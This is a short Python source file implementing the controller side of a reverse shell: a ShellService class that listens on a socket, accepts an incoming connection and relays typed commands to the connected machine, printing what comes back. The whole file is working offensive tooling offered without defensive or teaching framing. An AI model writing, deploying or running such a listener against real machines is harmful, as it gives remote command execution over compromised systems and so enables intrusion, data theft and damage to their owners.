import select
import socket
import sys


class ShellService:
    """Class used to create and control a reverse shell service"""

    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.ENCODING = 'utf-8'
        self.HEADER_LENGTH = 10

        self.server_socket = None
        # self.clients = {}
        self.sockets_list = []

    def _send_command(self, sock, cmd):
        """Encodes and sends commands to the client"""
        # Form the command header
        command_header = f"{len(cmd): <{self.HEADER_LENGTH}}".encode(self.ENCODING)
        command = cmd.encode(self.ENCODING)

        # Send of the command data to the client
        sock.send(command_header + command)

    def _receive_response(self, sock):
        """Receives the command output from the client machine"""
        try:

            response_header = sock.recv(self.HEADER_LENGTH)

            if not response_header:
                return None

            response_length = int(response_header.decode(self.ENCODING).strip())
            response = sock.recv(response_length).decode(self.ENCODING)

            return response

        except:
            return None

    def start(self):
        """Begin running the service"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.setblocking(True)
        self.server_socket.listen(5)

        print(f"[+] Listening for connections on {self.host} : {self.port}...")

        # Accept a new connection
        client_sock, client_addr = self.server_socket.accept()

        # Add the accepted socket to the list of sockets
        self.sockets_list.append(client_sock)

        print("Accepted new connection from {}:{}".format(*client_addr))

        # Begin the main server loop
        while True:
                    # After establishing the connection begin sending commands
                    cmd = input("")

                    # Send the command to the client
                    self._send_command(client_sock, cmd)

                    response = self._receive_response(client_sock)

                    if not response:
                        print("\nClosed connection from: {}".format(*client_addr))

                        # Remove the socket connection from the list of sockets
                        continue

                    print(response, end='')
